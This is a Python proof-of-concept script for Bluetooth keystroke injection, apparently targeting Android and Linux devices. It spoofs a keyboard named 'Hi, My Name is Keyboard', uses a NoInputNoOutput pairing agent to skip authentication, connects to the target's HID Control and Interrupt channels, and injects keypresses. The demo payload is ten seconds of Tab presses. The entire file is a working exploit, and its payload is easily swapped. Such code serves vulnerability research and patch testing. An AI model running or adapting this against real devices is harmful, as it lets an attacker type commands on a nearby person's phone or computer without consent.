#!/usr/bin/env python3

import argparse
import re
import time
from multiprocessing import Process

from injector.helpers import assert_address, log, run
from injector.client import KeyboardClient
from injector.adapter import Adapter
from injector.agent import PairingAgent
from injector.hid import Key, Mod
from injector.profile import register_hid_profile

# parse command line arguments
parser = argparse.ArgumentParser("keystroke-injection-android-linux.py")
parser.add_argument("-i", "--interface", required=True)
parser.add_argument("-t", "--target_address", required=True)
args = parser.parse_args()

# do a basic sanity check of the provided arguments
assert_address(args.target_address)
assert(re.match(r"^hci\d+$", args.interface))

# restart the local Bluetooth daemon
run(["sudo", "service", "bluetooth", "restart"])
time.sleep(0.5)

# register a generic HID SDP profile
profile_proc = Process(target=register_hid_profile, args=(args.interface, args.target_address))
profile_proc.start()

# setup the adapter
# - configure name and class
log.status("configuring Bluetooth adapter")
adapter = Adapter(args.interface)
adapter.set_name("Hi, My Name is Keyboard")
adapter.set_class(0x002540)
run(["hcitool", "name", args.target_address])
client = KeyboardClient(args.target_address, auto_ack=True)

# connect to Service Discovery Protocol on the target (L2CAP port 1)
log.status("connecting to SDP")
while not client.connect_sdp():
  log.debug("connecting to SDP")
adapter.enable_ssp()
log.success("connected to SDP (L2CAP 1) on target")

# run a NoInputNoOutput pairing agent
# - this tells the host that we don't support authenticationn
with PairingAgent(adapter.iface, args.target_address):

  # attempt to connect to HID Control and HID Interrupt on the target
  client.connect_hid_interrupt()
  client.connect_hid_control()

  # wait up to 1 second for one of the services to disconnect
  start = time.time()
  while (time.time() - start) < 1:
    if client.c17.connected == False or client.c19.connected == False:
      break
    time.sleep(0.001)

  # connect to HID Interrupt on the Mac (L2CAP port 19)
  if client.c19.connected == False:
    log.status("connecting to HID Interrupt")
    while not client.connect_hid_interrupt():
      log.debug("connecting to HID Interrupt")
      time.sleep(0.001)
  log.success("connected to HID Interrupt (L2CAP 19) on target")

  # connect to HID Control on the Mac (L2CAP port 17)
  if client.c17.connected == False:
    log.status("connecting to HID Control")
    while not client.connect_hid_control():
      log.debug("connecting to HID Control")
      time.sleep(0.001)
  log.success("connected to HID Control (L2CAP 17) on target")

# send an empty keyboard report
client.send_keyboard_report()

# send 10 seconds of 'tab' keypresses
log.status("injecting Tab keypresses for 10 seconds")
start = time.time()
while (time.time() - start) < 10:
  try:
    client.send_keypress(Key.Tab)
    time.sleep(0.05)
  except KeyboardInterrupt:
    break

# disconnect the L2CAP sockets
log.success("payload has been transmitted; disconnecting Bluetooth HID client")
client.close()

# take the adapter offline
log.status("taking '%s' offline" % args.interface)
adapter.down()
profile_proc.terminate()
